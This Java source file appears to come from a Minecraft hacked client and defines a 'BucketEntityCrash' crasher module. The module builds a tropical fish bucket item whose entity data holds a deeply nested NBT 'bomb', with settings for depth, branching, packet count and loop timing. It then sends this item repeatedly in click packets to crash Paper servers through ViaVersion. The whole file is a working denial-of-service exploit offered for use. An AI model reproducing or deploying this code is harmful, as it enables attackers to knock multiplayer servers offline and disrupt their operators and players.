package me.dannycrasher.client.module.impl.crash;

import com.viaversion.viafabricplus.ViaFabricPlus;
import java.util.concurrent.ScheduledExecutorService;
import me.dannycrasher.client.command.ArgumentType;
import me.dannycrasher.client.module.Module;
import me.dannycrasher.client.module.ModuleContext;
import me.dannycrasher.client.module.ModuleType;
import me.dannycrasher.client.protocol.Protocol;
import me.dannycrasher.client.protocol.components.data.DataComponents;
import me.dannycrasher.client.protocol.components.data.impl.DataBucketEntityData;
import me.dannycrasher.client.protocol.components.objects.ItemStack;
import me.dannycrasher.client.protocol.components.objects.ItemType;

public class BucketEntityCrash extends Module {
	private ScheduledExecutorService executorService;

	public BucketEntityCrash() {
		super("BucketEntity", "Bucket bucket_entity_data NBT bomb (Paper / Via Abuser)", ModuleType.CRASHER);
		addArgument("packets", ArgumentType.INT, 1, 100, "100");
		addArgument("nbtDepth", ArgumentType.INT, 1, 48, "24");
		addArgument("branchSize", ArgumentType.INT, 1, 32, "8");
		addArgument("map size", ArgumentType.INT, 1, 46, "46");
		addArgument("threadSleep", ArgumentType.INT, 1, 5000, "1500");
		addArgument("loopAmount", ArgumentType.INT, 1, 5000, "15");
	}

	@Override
	public void executeModule(ModuleContext context) {
		int protocol = ViaFabricPlus.getImpl().getTargetVersion().getVersion();
		if (!Protocol.FULL_ITEM_PROTOCOLS.contains(protocol)) {
			context.sendMessage("<red>You cant use this method on the version you are currently on. Change the version in viafabric");
			return;
		}

		DataComponents components = new DataComponents();
		components.put(new DataBucketEntityData(NbtBombTrees.entityBomb(
				context.getInt("nbtDepth"),
				context.getInt("branchSize"),
				"minecraft:tropical_fish"
		)));
		ItemStack stack = new ItemStack(ItemType.TROPICAL_FISH_BUCKET.getId(protocol), 1, components);
		executorService = ClickCrashRunner.startItemClick(
				this, context, executorService, stack,
				context.getInt("map size"), context.getInt("packets"),
				context.getInt("threadSleep"), context.getInt("loopAmount")
		);
	}

	@Override
	public void onDisconnect() {
		super.onDisconnect();
		ClickCrashRunner.shutdown(executorService);
	}
}
